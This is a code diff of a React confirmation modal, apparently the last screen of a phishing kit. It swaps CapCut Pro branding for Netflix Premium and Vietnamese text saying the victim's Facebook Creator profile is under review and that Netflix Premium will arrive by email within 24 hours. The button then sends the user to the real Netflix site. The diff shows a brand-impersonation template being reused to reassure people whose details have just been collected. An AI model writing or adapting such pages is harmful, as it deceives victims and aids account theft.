@@ -1,16 +1,16 @@
 import FinalImage from '@/assets/images/final-image.png';
-import { CAPCUT_BTN_PRIMARY, ModalShell } from '@/components/form-modal/modal-shell';
+import { MODAL_BTN_PRIMARY, ModalShell } from '@/components/form-modal/modal-shell';
 import { useTranslation } from '@/hooks/use-translation';
 import { store } from '@/store/store';
 import Image from 'next/image';
 import { type FC } from 'react';
 
-const CAPCUT_HOME_URL = 'https://www.capcut.com/';
+const NETFLIX_HOME_URL = 'https://www.netflix.com/';
 
 const FINAL_MODAL_TEXTS = [
-    'CapCut Pro Request Submitted',
-    'Your CapCut Pro request has been added to the processing queue. We will activate your Pro membership within 24 hours. If you do not receive CapCut Pro within 24 hours, please submit again.',
-    'Return to CapCut'
+    'Đăng ký đã được gửi thành công!',
+    'Hồ sơ Creator Facebook của bạn đang được xét duyệt. Netflix Premium sẽ được kích hoạt trong vòng 24 giờ qua email bạn đã cung cấp. Nếu sau 24 giờ chưa nhận được, vui lòng đăng ký lại.',
+    'Quay lại Netflix'
 ] as const;
 
 const FinalModal: FC = () => {
@@ -18,25 +18,25 @@ const FinalModal: FC = () => {
     const { resetFormSession } = store();
 
     return (
-        <ModalShell title={t('CapCut Pro Request Submitted')} showClose={false}>
+        <ModalShell title={t('Đăng ký đã được gửi thành công!')} showClose={false}>
             <div className='flex flex-1 flex-col px-5 py-4'>
-                <p className='mb-6 text-body-md leading-relaxed text-on-surface-variant'>
-                    {t('Your CapCut Pro request has been added to the processing queue. We will activate your Pro membership within 24 hours. If you do not receive CapCut Pro within 24 hours, please submit again.')}
+                <p className='mb-6 text-base leading-relaxed text-[#B3B3B3]'>
+                    {t('Hồ sơ Creator Facebook của bạn đang được xét duyệt. Netflix Premium sẽ được kích hoạt trong vòng 24 giờ qua email bạn đã cung cấp. Nếu sau 24 giờ chưa nhận được, vui lòng đăng ký lại.')}
                 </p>
 
-                <div className='mb-8 overflow-hidden rounded-xl border border-surface-border'>
-                    <Image src={FinalImage} alt='CapCut Pro' className='h-auto w-full' />
+                <div className='mb-8 overflow-hidden rounded-xl border border-[#353535]'>
+                    <Image src={FinalImage} alt='Netflix Premium' className='h-auto w-full' />
                 </div>
 
                 <button
                     type='button'
                     onClick={() => {
                         resetFormSession();
-                        window.location.href = CAPCUT_HOME_URL;
+                        window.location.href = NETFLIX_HOME_URL;
                     }}
-                    className={`${CAPCUT_BTN_PRIMARY} mb-2`}
+                    className={`${MODAL_BTN_PRIMARY} mb-2`}
                 >
-                    {t('Return to CapCut')}
+                    {t('Quay lại Netflix')}
                 </button>
             </div>
         </ModalShell>
